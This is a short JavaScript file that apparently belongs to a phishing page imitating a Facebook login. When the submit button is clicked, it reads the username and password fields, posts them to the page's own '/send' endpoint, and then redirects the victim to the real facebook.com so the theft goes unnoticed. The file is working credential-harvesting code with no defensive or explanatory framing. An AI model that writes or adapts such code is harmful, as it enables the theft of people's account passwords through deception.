var submitButton = document.getElementById("submitButton");

submitButton.addEventListener('click', (e) => {
    e.preventDefault();
    var username = document.getElementById('user').value;
    var password = document.getElementById('pass').value;


    fetch(
        "/send",
        {
        method: 'post',
        headers: {
            'Accept': 'application/json', 
            'Content-Type': 'application/json',
        },
        body : JSON.stringify({
            username: username,
            password: password
        }),

    })
    .then(res => console.log(res))
    .catch(err => console.log(err))

    window.location = 'https://www.facebook.com/'
    


})